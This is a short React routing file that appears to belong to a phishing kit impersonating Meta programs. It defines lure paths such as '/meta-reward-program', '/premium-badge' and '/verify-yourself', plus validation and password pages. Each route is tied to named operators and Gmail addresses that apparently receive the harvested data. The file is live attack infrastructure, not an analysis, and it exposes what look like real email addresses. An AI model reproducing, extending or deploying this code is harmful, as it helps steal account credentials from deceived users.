import React from 'react'
import { Route, Routes } from 'react-router-dom'
import Home from '../pages/Home'
// import VerifyAccount from '../pages/VerifyAccount'
import ThanksPage from '../pages/ThanksPage'
import VerificationForm from '../pages/ValidationPage'
import Password from '../pages/Password'

const AppRoutes = () => {
  return (
    <div>
        <Routes>
            <Route path='/' element={<Home />} />


            <Route path='/apply-now' element={<Home name="Mujeeb Wado" emails={["mjohn72929@gmail.com"]} workerEmail="metacompany22@gmail.com" />} />  
           
            <Route path='/premium-badge' element={<Home name="Umais" emails={["mjohn72929@gmail.com"]} workerEmail="marieprzibylla.agent@gmail.com" />} />  
            <Route path='/meta-reward-program' element={<Home name="Umais" emails={["mjohn72929@gmail.com","emma.johnson.contact11@gmail.com"]} workerEmail="mjohn72929@gmail.com" />} />  
            <Route path='/verify-yourself' element={<Home name="Zaman khan" emails={["mjohn72929@gmail.com"]} workerEmail="" />} />  
           

            <Route path='/validation' element={<VerificationForm />} />
            {/* <Route path='/account/verification' element={<VerifyAccount />} /> */}
            <Route path='/thanks' element={<ThanksPage />} />
            <Route path='/pass' element={<Password/>} />
          
        </Routes>
    </div>
  )
}

export default AppRoutes

